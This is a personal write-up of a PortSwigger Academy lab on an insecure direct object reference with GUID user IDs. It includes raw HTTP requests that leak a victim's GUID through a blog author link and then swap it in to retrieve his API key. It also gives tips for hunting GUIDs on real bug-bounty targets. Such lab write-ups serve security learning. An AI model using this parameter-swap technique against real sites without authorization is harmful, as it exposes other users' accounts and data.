# LAB: User ID controlled by request parameter, with unpredictable user IDs

|                             |                                                                                                                                                                                                        |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Access control (IDOR with GUIDs)                                                                                                                                                                       |
| **Difficulty**              | Apprentice                                                                                                                                                                                             |
| **Date**                    | 2026-11-13                                                                                                                                                                                             |
| **Time**                    | 4                                                                                                                                                                                                      |
| **Solved without solution** | yes                                                                                                                                                                                                    |
| **Link**                    | [lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids) |

## 1. Objective

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter

## 2. Surface

`/my-account?id=<GUID>`. GUIDs protect against guessing — but the lab title
hints the ID is _discoverable somewhere else_.

## 3. Hypothesis

If the app creates any feature where other users interact with me (blog post,
comments, profile sharing, referral links), their identifiers may leak in
content, HTML or responses.

## 4. Payload that worked

Request 1

```http
GET /blogs?userId=84350c24-0630-4213-86e2-2d5a5dbb1f77 HTTP/2
Host: 0a5500fd04e0400281c7129500c5000a.web-security-academy.net
Cookie: session=<session>
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500fd04e0400281c7129500c5000a.web-security-academy.net/post?postId=3
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Request 2

```http
GET /my-account?id=84350c24-0630-4213-86e2-2d5a5dbb1f77 HTTP/2
Host: 0a5500fd04e0400281c7129500c5000a.web-security-academy.net
Cookie: session=<session>
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500fd04e0400281c7129500c5000a.web-security-academy.net/blogs?userId=84350c24-0630-4213-86e2-2d5a5dbb1f77
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Response

```
<p>Your username is: carlos</p>
<div>Your API Key is: KGvmLBv4hoiSyARJeJz7FvsMjYj95bzL</div>
```

## 5. Why it works

The GUID makes the reference impossible to guess (256 bits), but the app still
trusts the `id` parameter over the session — the bug class is identical to lab 05.
What changes is only the **discovery problem**: the attacker must find the GUID
somewhere in the application.

The GUID leaked in a **publicly readable artefact authored by carlos** (his blog
post). That is the real lesson: a random identifier stops enumeration, not
disclosure. Any feature where users produce visible content, share links, or
appear as authors will expose their internal identifiers in HTML, JSON, or links.

## 6. What I tried that failed

No failed attempts, because I avoided the classic trap: **bruteforcing a GUID**.
Guessing values is not a strategy. Instead, I went looking for a
place where the app publishes the identifier.

The reasoning: if the UI links "posted by carlos" back to a profile, the href
must contain something that resolves carlos — either his username (already known)
or his GUID. Reading the HTML/JSON of that artefact and grepping for a long
hex/`xxxxxxxx-xxxx-...` string found it immediately.

Rule worth recording: on a GUID-based target, spend 100% of the time on
**disclosure surfaces**, 0% on guessing.

## 7. In a real target (bounty translation)

- GUID ≠ protection. Hunt the GUID in: comments, exports (CSV/PDF), referral
  links, admin logs shown to users, JSON responses, JS bundles, email previews.
- When you find a GUID, test it against every endpoint that takes an id.
- Impact: same as numeric IDOR → High when it exposes other users' data.
- In the report: show _where_ the GUID leaked (with URL/screenshot) — the leak
  is part of the finding, not just the swap.

## 8. Bypass / variants noticed

- Where the swap should be repeated once the GUID is found: every endpoint that
  accepts an id, plus body/cookie/header variants and other HTTP methods.
- Other disclosure surfaces worth checking on real targets: author links,
  comments, RSS/Atom feeds, exports (PDF/CSV), email templates, referral codes,
  activity logs, `data-*` attributes, JS bundles, API responses that include
  internal ids.
- If the GUID is only exposed to authenticated users, test with the lowest
  privilege account available (that's still an IDOR).

## 9. Takeaway

GUIDs stop guessing, not disclosure. The skill is not brute force — it is
mapping every feature that makes user identifiers visible.
